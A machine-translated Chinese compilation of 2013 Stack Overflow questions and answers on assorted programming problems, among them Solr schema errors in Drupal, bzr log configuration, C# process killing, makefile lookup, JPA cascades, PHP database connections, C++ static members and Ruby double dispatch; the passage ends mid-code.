> 标签：drupal, solr

```
Indexing failed on one of the following entity ids: node/2 
"400" Status: ERROR: [doc=l8febs/node/2] unknown field 'language': ERROR: [doc=l8febs/node/2] unknown field 'language'

Error 400 ERROR: [doc=l8febs/node/2] unknown field 'language'

HTTP ERROR 400
Problem accessing /solr/update. Reason:
ERROR: [doc=l8febs/node/2] unknown field 'language'Powered by Jetty:// 
```

我想知道是什么问题。我的`schema.xml`文件没有名为语言的字段，这能解决问题吗？我从来不需要这个？

架构.xml

```
<field name="id" type="string" indexed="true" stored="true" required="true" />
<field name="name" type="string" stored="true" indexed="true"/> 
<!-- entity_id is the numeric object ID, e.g. Node ID, File ID -->
<field name="entity_id"  type="long" indexed="true" stored="true" />
<!-- entity_type is 'node', 'file', 'user', or some other Drupal object type -->
<field name="entity_type" type="string" indexed="true" stored="true" required="true" />
<!-- bundle is a node type, or as appropriate for other entity types -->
<field name="bundle" type="string" indexed="true" stored="true"/>
<field name="bundle_name" type="string" indexed="true" stored="true"/>
<field name="text" type="text" stored="true" indexed="true"/>
<field name="site" type="string" indexed="true" stored="true"/>
<field name="hash" type="string" indexed="true" stored="true"/>
<field name="url" type="string" indexed="true" stored="true"/>
<!-- label is the default field for a human-readable string for this entity (e.g. the  title of a node) -->
<field name="label" type="text" indexed="true" stored="true" termVectors="true"  omitNorms="true"/>
<!-- The string version of the title is used for sorting -->
<copyField source="label" dest="sort_label"/>
<!-- content is the default field for full text search - dump crap here -->
<field name="content" type="text" indexed="true" stored="true" termVectors="true"/>
<field name="teaser" type="text" indexed="false" stored="true"/>
<field name="language" type="text_en" stored="true" indexed="true"/>
<field name="path" type="string" indexed="true" stored="true"/>
<field name="path_alias" type="text" indexed="true" stored="true" termVectors="true" omitNorms="true"/> 
```

apache solr 3.2 和 schema.xml 来自 drupal 7 的 apache solr 集成模块

solrconfig.xml 是

```
<requestHandler name="dismax" class="solr.SearchHandler">
  <lst name="defaults">
   <str name="defType">dismax</str>
   <str name="echoParams">explicit</str>
   <bool name="omitHeader">true</bool>
 </lst>
</requestHandler>

<!-- Note how you can register the same handler multiple times with
    different names (and different init parameters)
-->
 <requestHandler name="drupal" class="solr.SearchHandler">
   <lst name="defaults">
     <str name="defType">dismax</str>
     <str name="echoParams">explicit</str>
     <bool name="omitHeader">true</bool>
     <float name="tie">0.01</float>
     <str name="pf">
         content^2.0
     </str>
    <int name="ps">15</int>
      <!-- Abort any searches longer than 4 seconds -->
      <!-- <int name="timeAllowed">4000</int>  -->
     <str name="mm">1</str>
    <str name="q.alt">*:*</str>

    <!-- example highlighter config, enable per-query with hl=true -->
      <str name="hl">true</str>
      <str name="hl.fl">content</str>
      <int name="hl.snippets">3</int>
      <str name="hl.mergeContiguous">true</str>
      <!-- instructs Solr to return the field itself if no query terms are
    found -->
     <str name="f.content.hl.alternateField">teaser</str>
     <str name="f.content.hl.maxAlternateFieldLength">256</str>
     <!-- JS: I wasn't getting good results here... I'm turning off for now
      because I was getting periods (.) by themselves at the beginning of
      snippets and don't feel like debugging anymore.  Without the regex is
      faster too -->
     <!--<str name="f.content.hl.fragmenter">regex</str>--> <!-- defined below -->

     <!-- By default, don't spell check -->
      <str name="spellcheck">false</str>
      <!-- Defaults for the spell checker when used -->
      <str name="spellcheck.onlyMorePopular">true</str>
      <str name="spellcheck.extendedResults">false</str>
      <!--  The number of suggestions to return -->
     <str name="spellcheck.count">1</str>
    </lst>
    <arr name="last-components">
      <str>spellcheck</str>
    </arr>
  </requestHandler> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T06:26:58.260

如果您不想要字段，您可以简单地忽略这些字段以防止它们导致错误。例如

定义一个忽略的字段类型：-

```
<fieldtype name="ignored" stored="false" indexed="false" class="solr.StrField" /> 
```

并定义一个动态字段：-

```
<dynamicField name="some regex to capture all unwanted fields"  type="ignored"/> 
```

# linux - 如何避免创建 .bzr.log（集市日志文件）或将其配置为在 ~/.bazaar/ 而不是 ~/？

> ID：15845713
> 
> 赞同：2
> 
> 时间：2013-04-06T00:36:10.077
> 
> 标签：linux, windows, configuration, dvcs, bazaar

有没有办法告诉`bzr`不要将所有内容都记录到`~/.bzr.log`，或者将其配置为将日志文件放到 ~/.bazaar/` 中？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T00:36:10.077

环境[变量`BZR_LOG`](http://doc.bazaar.canonical.com/bzr.2.0/en/user-reference/index.html#environment-variables)允许

*   `/dev/null`通过在 unixoid 系统和`NUL`Windows上将其设置为来禁止创建日志文件。
*   通过将日志文件指向该路径（例如`export BZR_LOG=$HOME/.bazaar/bzr.log`在 Linux 上），在替代路径中创建日志文件。

### 配置：

*   在 Linux 和其他 unixoid 系统中，您可以使用`/etc/profile`or `$HOME/.profile`(or `$HOME/.bash_profile`and `$HOME/.bashrc`.

*   在 Windows 中，您可以通过右键单击桌面然后在左窗格中选择`Computer`并从那里单击按钮来设置变量。弹出的对话框（下面的屏幕截图）允许您设置新变量或编辑现有变量。这是它在 Windows 7 上的外观：`Properties``Advanced system settings``Environment variables`![Windows 7 上的环境变量配置对话框](https://i.stack.imgur.com/Q8fH2.png)

* * *

**理由：**我花了一段时间才弄明白，搜索词`.bzr.log`，即使被引用，最终也会指向`bzr log`或这个问题：[文件 `.bzr.log` 的格式记录在哪里？](https://stackoverflow.com/questions/3430864/where-is-the-format-of-the-file-bzr-log-documented)这些都不是特别有用，所以我想我会分享发现的事实问答风格，以供未来研究同一主题的内部人员使用。

# c# - 如何使用c#杀死应用程序

> ID：15845721
> 
> 赞同：1
> 
> 时间：2013-04-06T00:37:42.730
> 
> 标签：c#, kill

这是我的情况：我正在使用 c# 并打开多个 pdf 文件。观看时`taskmanager`，我看到我打开的每个新文件都显示在应用程序选项卡中，而只有 2 个`adobe32`进程。如果我`getprocesses`按名称执行，我会看到这两个进程，如果我深入了解它们，我能够识别我通过主窗口标题名称打开的 pdf 文件之一，但我无法找到另一个。我的目标是能够终止我选择的任何窗口，而不必关闭它们。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T04:19:38.310

您需要将 P-Invoke 与您的窗口句柄 ID 一起使用：

关闭窗口：

[http://www.pinvoke.net/default.aspx/user32.closewindow](http://www.pinvoke.net/default.aspx/user32.closewindow)

或销毁窗口：

[http://www.pinvoke.net/default.aspx/user32/DestroyWindow.html](http://www.pinvoke.net/default.aspx/user32/DestroyWindow.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T05:06:32.203

我有一个解决方案，但这取决于您是否对如何打开 PDF 文件有要求。在没有看到你在做什么的情况下，我只能在这一点上做出假设。无论如何，这种方法不涉及使用 p-invoke 来丢弃打开的窗口。

如果您调用 AcroRd32.exe 使用 /n 命令行开关并传递 PDF 文件的路径，那么它将为您打开的每个 PDF 文件打开一个新的 AcroRd32.exe 实例。然后可能有多种方法可以关闭某个 PDF 文档。

这是一种打开这两个文件的简单方法，因为您仍然可以访问 pdfProcess1 ，您可以将其杀死：

```
Process pdfProcess1 = new Process();
pdfProcess1.StartInfo = new ProcessStartInfo("AcroRd32.exe", "/n" + Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "SomePDFDoc1.pdf"));
pdfProcess1.Start();

Process pdfProcess2 = new Process();
pdfProcess2.StartInfo = new ProcessStartInfo("AcroRd32.exe", "/n" + Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "SomePDFDoc2.pdf"));
pdfProcess2.Start();

pdfProcess1.Kill(); 
```

# jquery-masonry - 使用带有流体全宽网格的 jquery 砌体

> ID：15845724
> 
> 赞同：2
> 
> 时间：2013-04-06T00:37:58.133
> 
> 标签：jquery-masonry, fluid-layout

我正在努力迫使 Masonry 正确定位 boostrap 的全宽网格的元素。正如您将看到的那样，主页正在使用元素宽度固定的容器，并且一切都按预期工作。但另一方面，新闻页面正在使用全宽流体系统，由于某种原因，新闻页面上的“块”不适合窗口。

这是我对砌体的要求：

```
self.$("#masonry").masonry({
itemSelector: '.parallax',
isAnimated: !Modernizr.csstransitions,
columnWidth: function( containerWidth ) {
return containerWidth / 6;
}); 
```

这是一个示例链接[http://wheniamplaying.com/kitchenV3/en/home](http://wheniamplaying.com/kitchenV3/en/home)

在这种情况下可以使用砖石吗？

# makefile - 如何从子目录启动 make

> ID：15845730
> 
> 赞同：0
> 
> 时间：2013-04-06T00:39:05.357
> 
> 标签：makefile, subdirectory

我有一个顶级`Makefile`。该项目有几个不同深度的子目录。

如何`make`从任何子目录启动，以便它使用顶级 Makefile，就像`git`自动查找其顶级`.git`目录一样？

结构 ：

```
/
/a/
/b/c
/Makefile
/Readme 
```

设想 ：

```
/$ make
... Works ...
/b$ make
... Cannot find makefile 
```

我希望第二种情况与第一种情况相同。

提示，理想情况下，它可以作为 中的`:make`规则`vi`，但不应该是特定于 vi 的

更新：/不是根目录，只是项目的根目录，真正的意图是模仿git

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T03:21:18.440

Beta 的提示会起作用。创建别名

```
alias make=`sh /home/makecrawl.sh` 
```

`makecrawl.sh`看起来像哪里

```
#! /bin/bash
while ! [ -f makefile ] &&  [$PWD != "/" ]
do
cd ..
done
make 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T13:05:35.823

```
#!/bin/bash  

HERE=$PWD

while ! [ -f Makefile ] && [ $PWD != "/" ]
do
 cd ..
done

MFILE=$PWD/Makefile

cd $HERE
make -f $MFILE 
```

# git - 少数开发人员使用 Xamarin.iOS 的 git-tf 工作流最佳实践

> ID：15845734
> 
> 赞同：0
> 
> 时间：2013-04-06T00:39:54.233
> 
> 标签：git, xamarin.ios, git-tf

我在一家使用 Xamarin 开发 iOS 应用程序的公司工作。我们选择 Xamarin 是因为我们已经是 C#、.NET 和 TFS 商店，并且使用 git-tf 可以轻松地将 TFS 与喜欢 git 的 Xcode 环境集成。但是我仍然不确定哪种工作流程是最佳实践并且最不让人头疼。我特别在寻找一个安全的工作流程（即，我不会使用变基或你有什么不小心删除我所有的工作）。

我已经阅读了 git-tf 的[Working With Teams](http://gittf.codeplex.com/wikipage?title=Working%20with%20Teams&referringTitle=Home)页面，但这并不是很有帮助。

*   除了 TFS，我还应该有一个中央 git 存储库吗？
*   我应该在分支机构还是本地大师上工作？
*   拉动时应该使用 --rebase 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T01:05:05.217

1.  通常不需要中央 git 存储库。我发现大多数用户发现他们想在本地使用 git-tf 并负责自己集成到 TFS 中。

2.  我建议使用 master 来跟踪 TFS。（事实上​​，`git-tf`目前强制执行此操作。）在功能分支中工作，然后合并到您的主分支并签入到 TFS。我要做的是：

    *   用于`git-tf`克隆 TFS 存储库
    *   `feature`从 master创建一个功能分支，我们称之为它。
    *   做一些工作，根据需要投入`feature`。
    *   合并，并签`feature`入`master`到 TFS。更好：变基并压缩成一个提交。
3.  大概。保持你的历史线性是一件好事。但是，如果您使用上面 #2 中概述的工作流程，则不需要。

# java - 寻找最小和最大的人口和平均值

> ID：15845736
> 
> 赞同：-1
> 
> 时间：2013-04-06T00:39:58.847
> 
> 标签：java, average, delimiter

我一直在努力让这个程序正常工作。我在让程序读取我创建的文件时遇到了一点麻烦，`census2000`并且`census2010`. 这些包含 2000 年和 2010 年的 50 个州及其人口。我相信我的程序的其余部分是正确的。我被告知要使用方法来找到最小的人口、最大的人口和平均值。这是 2000 文件中的两行：

阿拉巴马州 4447100

阿拉斯加 626932

这是我的程序：

```
public static void main(String[] args) throws IOException {
        String state = "";
        int population = 0;
        int p = 0, s = 0, pop = 0, stat = 0, populate = 0, sum = 0;
        File f = new File("census2000.txt");
        Scanner infile = new Scanner(f);
        infile.useDelimiter("[\t|,|\n|\r]+");
        while (infile.hasNext()) {
            checksmall(p, s);
            checklargest(pop, stat);
            checkAverage(populate, sum);
            population = infile.nextInt();
            state = infile.next("/t");
            System.out.println(state + "has" + population + "people");
        }

        System.out.println(state + "has smallest population of" + population);
        prw.close();
    }

    public static boolean checksmall(int p, int s) {
        boolean returnValue;
        if (p < s) {
            returnValue = true;
        } else {
            returnValue = false;
        }
        return (returnValue);
    }

    public static boolean checklargest(int pop, int stat) {
        boolean returnVal;
        if (pop > stat) {
            returnVal = true;
        } else {
            returnVal = false;
        }
        return (returnVal);
    }

    public static int checkAverage(int populate, int sum) {
        int retVal;
        retVal = populate + sum;
        return (retVal);
    }
      } 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T00:54:37.647

我相信问题出在这里：

```
state = infile.next("/t"); 
```

我认为您要做的是跳过文件中的选项卡并读取状态？您可以通过读取该行然后使用`\t`分隔符分割该行来做到这一点。

```
String line;
while (infile.hasNextLine()){
    line = infile.nextLine();
    String data[] = line.split("\\s+");
    state = data[0];
    population = Integer.parseInt(data[1]);
} 
```

编辑：也正如另一个答案指出的那样，您正在尝试在读取文件数据之前对其执行功能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T00:54:26.450

您需要在文件加载之后/期间调用 checksmall、checklargest 和 checkAverage。

# facebook-graph-api - 无法使用 API Explorer 执行图形用户搜索

> ID：15845738
> 
> 赞同：6
> 
> 时间：2013-04-06T00:40:15.650
> 
> 标签：facebook-graph-api, search

当我手动使用 Graph API Explorer 针对我的应用程序为自己生成访问令牌时，我遇到了让图形搜索工作的问题。

我创建了一个应用程序，将沙盒模式设置为“关闭”，然后手动授予我的用户帐户对我的应用程序的权限。为了安全起见，我在生成访问令牌之前包含了图形 API 资源管理器中可用的所有权限。

当我单击我的访问令牌时，我看到它仍然有效，并且列出了所有权限，但是，当我执行以下搜索时：

`/search?q=myphonenumber&type=user`

我收到一条错误消息：

```
{
  "error": {
    "message": "(#200) Must have a valid access_token to access this endpoint", 
    "type": "OAuthException", 
    "code": 200
  }
} 
```

我知道上面的搜索代码是有效的，因为几天前我能够让它工作，我似乎无法弄清楚发生了什么变化。我是否在某处遗漏了阻止我使用访问令牌进行 API 搜索的权限？

更新：我还应该提到正常`/me`查询工作得很好，似乎只有不允许的搜索。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T10:06:04.890

使用相同的搜索词搜索电子邮件地址时，我遇到了同样的问题。在研究问题时，我发现了这个错误报告：[https](https://developers.facebook.com/bugs/453298034751100?browse=search_516534c213df06064266897) ://developers.facebook.com/bugs/453298034751100?browse=search_516534c213df06064266897 。所以 Facebook 意识到了这个问题，但一个多星期以来没有任何改变。

# ruby-on-rails - Rails ajax表单不从另一个提交

> ID：15845741
> 
> 赞同：2
> 
> 时间：2013-04-06T00:40:24.383
> 
> 标签：ruby-on-rails, ajax, jquery, ruby-on-rails-3.2

我有一个 Rails 3.2 ajax 表单，可以为酒店创建一个新房间。新的 Room ajax 表单在 Room 索引页面上可以正常工作，但是一旦我将新的 Room ajax 表单嵌入到酒店编辑页面上，该表单会在不使用 Ajax 的情况下正常提交。

要创建新的 Room 表单，我使用 Hotel edit.html.erb 页面上的以下链接：

```
<%#= link_to 'Add a Room', new_room_path(:hotel_id => @hotel.id), :remote => true, :class => 'new_room' %> 
```

这会将以下表单部分加载到同一页面上：

```
<%= form_for @room, :remote => true, :html => { :class => "remote-form" } do |f| %>
 <%= f.text_field :number %>
 <%= f.text_field :size %>

  <% if(params.has_key?(:'hotel_id')) %>
    <% @hotel_id = params[:hotel_id] %>
    <%= f.hidden_field :hotel_id, :value => @hotel_id %>                    
  <% else %>
    <%= f.collection_select(:hotel_id, Hotel.all, :id, :name) %>
  <% end %>

 <%= f.submit "Add this room", :class => 'room_create' %>
 <%= link_to 'Cancel', '#', :class => "room_cancel" %>
<% end %> 
```

最后，我的 create.js.erb 中有以下内容（在 rooms 文件夹内）：

```
alert('Test creating a room');
var content = $('<%= escape_javascript(render(@room)) %>');
$("#room_list tbody").append(content); 
```

create.js.erb 没有执行，并且定期提交表单（非 ajax），我终于到达了房间 show.html.erb 页面。

为什么表格在 Units 索引页面上正常工作，但在关联的酒店编辑页面上却没有？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T00:48:04.470

即使您设置`:remote => true`了 ，Rails 也会生成一个`form`标签。**浏览器不支持嵌套表单标签，会导致不可预知的行为。**

您应该在这里重新考虑视图架构。可能您可以拥有酒店表单之外的房间表单，或者您可以使用[`fields_for`](http://api.rubyonrails.org/classes/ActionView/Helpers/FormHelper.html#method-i-fields_for)和[`accepts_nested_attributes_for`](http://api.rubyonrails.org/classes/ActiveRecord/NestedAttributes/ClassMethods.html)编辑子对象。

这是有关如何使用嵌套属性的完整示例：[嵌套属性示例](http://api.rubyonrails.org/classes/ActionView/Helpers/FormHelper.html#method-i-fields_for-label-Nested+Attributes+Examples)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T00:47:15.253

您不能将表单嵌套在 HTML 中的表单中。当您单击表单上的任何提交按钮时，即使它在另一个表单内，也只会正确提交最外面的表单。

您可以使用[嵌套属性](http://api.rubyonrails.org/classes/ActiveRecord/NestedAttributes/ClassMethods.html)将房间的属性直接添加到表单中，以便在提交整个表单时所有房间都...或者使用 div 和链接，而不是表单和提交按钮.

# mysql - 如何坚持但避免唯一键异常？

> ID：15845743
> 
> 赞同：0
> 
> 时间：2013-04-06T00:40:33.937
> 
> 标签：mysql, jpa, jpa-2.0

我的问题很简单：
A`user`有`address`,`address`由`city`,`state`和组成`country`。

所以为此我有这个结构：

```
public class User {
  ..
  //bi-directional many-to-one association to UserAddress
  @ManyToOne(cascade = {CascadeType.PERSIST, CascadeType.MERGE})
  @JoinColumn(name="id_user_address")
  private UserAddress userAddress;
  ..
} 
```

请注意，`CascadeType` **没有**，`CascadeType.ALL`因为如果用户被删除，它不会影响`cities, states and countries`创建的。

```
public class UserAddress {
  ..
    //bi-directional many-to-one association to AddressCity
    @ManyToOne(cascade = {CascadeType.PERSIST, CascadeType.MERGE, CascadeType.})
    @JoinColumn(name="id_city")
    private AddressCity addressCity;

    //bi-directional many-to-one association to AddressCountry
    @ManyToOne(cascade = {CascadeType.PERSIST, CascadeType.MERGE})
    @JoinColumn(name="id_country")
    private AddressCountry addressCountry;

    //bi-directional many-to-one association to AddressState
    @ManyToOne(cascade = {CascadeType.PERSIST, CascadeType.MERGE})
    @JoinColumn(name="id_state")
    private AddressState addressState;
  ..
} 
```

我的问题是，如果我尝试注册一个具有相同功能的用户，`city`例如它会给我一个例外：

> 严重：原因：com.mysql.jdbc.exceptions.jdbc4.MySQLIntegrityConstraintViolationException：键“city_UNIQUE”的重复条目“Campinas”

我怎样才能避免这种`constraint`，保持`CASCADE`？
有谁知道如何在我的 JSF 项目中显示 JPA 所做的查询？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T07:05:26.533

对于每个持久化的要持久化的原因的注释和对于每个持久化`CascadeType.PERSIST`的要持久化的原因的注释。因此，当您将用户保留在同一个城市时，会尝试使用相同的键来保留新城市，这会导致违反约束。所以删除那些 ManyToOne 注释关系的级联。`User.userAddress``userAddress``User``CascadeType.PERSIST``UserAddress.addressCity``addressCity``UserAddress`

您必须在保存用户时检查 userAddress 是否已经存在，并在保存 UserAddress 时检查其中的关系是否已经存在并采取必要的措施。

# php - 多个数据库连接 PHP

> ID：15845744
> 
> 赞同：1
> 
> 时间：2013-04-06T00:40:43.587
> 
> 标签：php, mysql, oop, pdo

我很难找到解决这个问题的好方法。我的网站上有多个类，它们都处理不同的事情。我有一个评论类、一个配置文件类、一个登录类等等。到目前为止，我对我的代码设计很满意，因为基本上所有的逻辑都来自我的 html 模板。所以我的模板中只有非常少的逻辑。唯一的问题是，我有一个用于数据库连接的类，并且我从数据库类扩展每个类并使用父构造函数连接到数据库。唯一的问题是每个页面上至少有 2 个单独的类，现在网站变得越来越复杂，我每页有 4 或 5 个类，它明显影响加载时间，因为我必须重新连接到每个数据库时间。

我的问题是在课堂上使用数据库连接的最佳方式是什么。我在想也许数据库查询必须在 html 中处理，或者我可以创建一个完整的函数文件，该文件包含在每个加载了数据库连接的页面上。但我想知道更有经验的程序员如何做到这一点，以便我能以正确的方式修复它。

感谢您的建议。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-06T03:31:43.957

尽管您可以使用单例来确保只使用一个连接，但对于这种诚实的模式，似乎在 Stack Overflow 上宣布了一场圣战。

然而，从 DB 类扩展应用程序类是一个坏主意。这些类没有任何共同之处。数据库类只是一个服务 - 所以，将它用作服务。您的某些课程肯定也必须发送电子邮件 - 您是否也从电子邮件课程扩展您的课程？

您必须实例化您的 DB 类一次，然后将此对象传递给其构造函数中的其他类。最简单的方法是使用 just `global $db;`，或者您可以在构造函数参数中传递它们。或者使用广为宣传的依赖注入方法。

无论如何，您应该在整个脚本执行过程中使用**单一连接（具有相同的凭据）。**多次打开和关闭连接并不比同时拥有多个连接好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T00:47:43.630

如果使用 MySQli：

```
$Con_1 = new mysqli ("host","user","password","database");
$Con_2 = new mysqli ("host","user","password","database");
$Con_3 = new mysqli ("host","user","password","database"); 
```

然后与以下交互：

```
$PreparedStatement_1 = $Con_1->prepare(); // Connect to database instance specified in $con_1
$PreparedStatement_1->bindparam('',);
$PreparedStatement_1->execute();
$PreparedStatemet_1->close(); // close to free up other statements
$PreparedStatement_2 = $Con_2->prepare(); // Connect to database instance specified in $con_2
$PreparedStatement_2->bindparam('',);
$PreparedStatement_2->execute();
$PreparedStatemet_2->close(); // close to free up other statements 
```

如果使用 PDOMysql

```
$Con_1 = new PDO('mysql:dbname=testdb;host=127.0.0.1', 'dbuser', 'dbpass');
$Con_2 = new PDO('mysql:dbname=testdb;host=127.0.0.1', 'dbuser', 'dbpass');
$Con_3 = new PDO('mysql:dbname=testdb;host=127.0.0.1', 'dbuser', 'dbpass'); 
```

示例或多或少与 MySQli 示例相同。

不建议，由`mysql`

```
$Con_1 = mysql_connect('localhost', 'mysql_user', 'mysql_password');
$Con_2 = mysql_connect('localhost', 'mysql_user', 'mysql_password'); 
```

与。。。相互作用：

```
$Query = mysql_query("",$Con_1);
$Query2 = mysql_query("",$Con_2); 
```

如果您想编写代码，您可以这样做。但是可以使用 PHP 完成多个数据库实例，并且有可用的框架：

> Codeigniter、CakePHP、Symphony、Wordpress

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-11-16T14:43:53.387

我认为在这种情况下使用单变量或全局变量是最好的。使用单例和全局变量被认为是一种不好的做法，因为它们很容易被滥用。但在这种情况下，好处克服了缺点。

此外，在开源平台上使用单例或全局进行数据库连接是一种常见的做法： - 在 Magento 中使用单例来获取/设置 PDO 对象 - 在 Wordpress 中使用全局来维护 mysql_connect 函数返回的资源.

您可以通过向连接器添加工厂行为来避免类依赖。因此，我建议你写这样的东西：

```
class DBconnector
{
    private static $_connections = array();

    private static createConnection($type)
    {
        switch($type){
            case 'pdo':
            default:
                return new PDO('mysql:dbname=testdb;host=127.0.0.1', 'dbuser', 'dbpass');
        }
    }

    public static getConnection($type)
    {
        if(!isset(self::_connections[$type])){
            self::_connections[$type] = self::createConnection($type);
        }
        return self::_connections[$type];
    }
} 
```

# c++ - 访问静态变量 C++ 时出现 LNK2001 错误

> ID：15845745
> 
> 赞同：12
> 
> 时间：2013-04-06T00:41:03.757
> 
> 标签：c++, static

尝试使用纹理时，我尝试在代码中使用静态变量，但是我不断收到此错误：

```
1>Platform.obj : error LNK2001: unresolved external symbol "private: static unsigned int Platform::tex_plat" (?tex_plat@Platform@@0IA) 
```

我已经在 cpp 文件中正确初始化了变量，但是我相信在尝试以另一种方法访问它时会发生此错误。

。H

```
class Platform :
public Object
{
    public:
        Platform(void);
        ~Platform(void);
        Platform(GLfloat xCoordIn, GLfloat yCoordIn, GLfloat widthIn);
        void draw();
        static int loadTexture();

    private:
        static GLuint tex_plat;
}; 
```

.cpp 类：这是初始化变量的地方

```
int Platform::loadTexture(){
 GLuint tex_plat = SOIL_load_OGL_texture(
            "platform.png",
            SOIL_LOAD_AUTO,
            SOIL_CREATE_NEW_ID,
            SOIL_FLAG_INVERT_Y
            );

    if( tex_plat > 0 )
    {
        glEnable( GL_TEXTURE_2D );
        return tex_plat;
    }
    else{
        return 0;
    }
} 
```

然后我希望在这个方法中使用 tex_plat 值：

```
void Platform::draw(){
    glBindTexture( GL_TEXTURE_2D, tex_plat );
    glColor3f(1.0,1.0,1.0);
    glBegin(GL_POLYGON);
    glVertex2f(xCoord,yCoord+1);//top left
    glVertex2f(xCoord+width,yCoord+1);//top right
    glVertex2f(xCoord+width,yCoord);//bottom right
    glVertex2f(xCoord,yCoord);//bottom left
    glEnd();
} 
```

有人可以解释这个错误。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-04-06T00:49:55.250

静态成员必须在类主体之外定义，因此您必须添加定义并在那里提供初始化程序：

```
class Platform :
public Object
{
    public:
        Platform(void);
        ~Platform(void);
        Platform(GLfloat xCoordIn, GLfloat yCoordIn, GLfloat widthIn);
        void draw();
        static int loadTexture();

    private:
        static GLuint tex_plat;
};

// in your source file
GLuint Platform::tex_plat=0; //initialization 
```

也可以在你的类中初始化它，但是：

> 要使用该类内初始化语法，常量必须是由常量表达式初始化的整型或枚举类型的静态常量。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-06T00:47:28.787

添加这个：

```
GLuint Platform::tex_plat; 
```

在你的班级声明之后。

# javascript - 淘汰赛和应用绑定 - 这里发生了什么？

> ID：15845747
> 
> 赞同：0
> 
> 时间：2013-04-06T00:41:15.843
> 
> 标签：javascript, knockout.js

我有这个：

```
socket.bind('TodayTutors', function (data) {
            tuts.push(data);
            ko.applyBindings(tuts);
        }); 
```

现在，此绑定每 30 秒接收一次数据。然后我将这个数据推送到一个可观察的数组，我希望这个数据被渲染。现在，这不起作用，但为什么呢？如果我在渲染之前放置一个断点`ko.applyBindings(tuts);`，`data`然后当我释放断点时，这个渲染被删除。所以我尝试了这样的事情，希望 .push() 会自动更新我的视图：

```
ko.applyBindings(tuts);
socket.bind('TodayTutors', function (data) {
                tuts.push(data);
            }); 
```

但这也不想工作。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T00:59:15.920

似乎`ko.applyBindings();`以某种方式操纵应用程序的流程，我通过这样做解决了我的问题：

```
{
   ko.applyBindings(tuts);
}
socket.bind('TodayTutors', function (data) {
                tuts.push(data);
            }); 
```

# ruby - 尝试理解双重调度模式

> ID：15845748
> 
> 赞同：13
> 
> 时间：2013-04-06T00:41:25.530
> 
> 标签：ruby, design-patterns

我一直在尝试理解[双重调度模式](http://en.wikipedia.org/wiki/Double_dispatch)并且遇到了困难。我终于尝试了一个示例程序来帮助自己理解。[这是](https://gist.github.com/udit99/5323252)要点。[但是后来我决定在没有双重调度](https://gist.github.com/udit99/5323268)的情况下尝试它，并且解决方案看起来并没有比平时更糟糕。我究竟做错了什么？

编辑：根据建议，我在[这里](https://softwareengineering.stackexchange.com/questions/194082/attempt-at-understanding-the-double-dispatch-pattern)发布了这个问题。保留此链接以进行重定向。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-04-06T03:49:18.897

在单一分派中——你在大多数现代 OO 语言中看到的——一个方法是基于单个对象的运行时类型*分派的。*这显示为点运算符（在 ruby​​、java、javascript 等中）或箭头运算符（perl、c++）。

```
# look, ma single dispatch!
# method on obj's run-time type that is called
dentist.work_on(patient) 
```

那么，双重分派将基于*两个*对象的运行时类型。这看起来有几种方式；该方法应该存在于哪个对象上？

```
# Hmm, this looks weird.
# Is the method in to dentist.class or patient.class?
(dentist, patient).do_dentistry()

# okay, this looks more familiar; the method lives on obj1.class
# This only works in static-typed languages which support double dispatch
# in which you declare the type of the method parameters.
dentist.work_on(patient)

class Dentist
   def work_on(Adult patient); ...; end
   def work_on(Child patient); ...; end
end 
```

像 groovy 这样具有多个调度的语言概括了上面的第二个示例；他们在选择运行哪种方法时会考虑*所有参数的运行时类型。*例如，参见这篇关于 groovy 和多分派[的博客文章。](http://mrhaki.blogspot.com/2009/09/groovy-goodness-multimethods-or.html)

大多数现代 OO 语言只有单次分派，而多分派*模式*试图将多分派的好处引入语言。它甚至适用于像 ruby​​ 这样的动态语言。它通过连续执行*两次*单次调度来工作。第一个方法调用将调用第二个对象的方法。

```
class Dentist
    def work_on(patient)
       patient.dispatch_work(self)
    end
    def work_on_adult(patient)
      drill_as_hard_as_you_can(patient)
    end
    def work_on_child(patient)
      use_bubble_gum_toothpaste(patient)
      give_toothbrush_to(patient)
    end
end

class Doctor
    def work_on(patient)
       patient.dispatch_work(self)
    end
    def work_on_adult(patient)
      do_checkup(patient)
    end
    def work_on_child(patient)
      assure_presence_of(patient.guardian)
      ask_questions_to(patient.guardian)
      do_checkup(patient)
      give_cheap_toy_to(patient)
    end
end

class Adult
    def dispatch_work(dentist)
      dentist.work_on_adult(self)
    end
end

class Child
    def dispatch_work(dentist)
      dentist.work_on_child(self)
    end
end 
```

双分派*模式*就是我所说的低级模式，因为其他模式都是建立在它之上的。例如，访问者模式在很大程度上依赖于双重调度模式。

* * *

**更新**刚刚看到你的要点。您的第一个要点并不是真正进行双重调度。当然，您分派了两次，但您并没有改变第二次分派中的行为。要将其更改为双重调度，我会做这样的事情。

```
class Chicken
  def make_dispatch dish
    dish.make_with_chicken self
  end
end

class Beef
  def make_dispatch dish
    dish.make_with_beef self
  end
end

module Dish
  def make meat
    meat.make_dispatch self
  end
end

class Sandwich
  include Dish

  def make_with_chicken chicken
    puts "Grilled Chicken Sandwich"
  end

  def make_with_beef beef
    puts "Roast Beef Sandwich"
  end
end

class Stew
  include Dish

  def make_with_chicken chicken
    puts "Thai curry"
  end

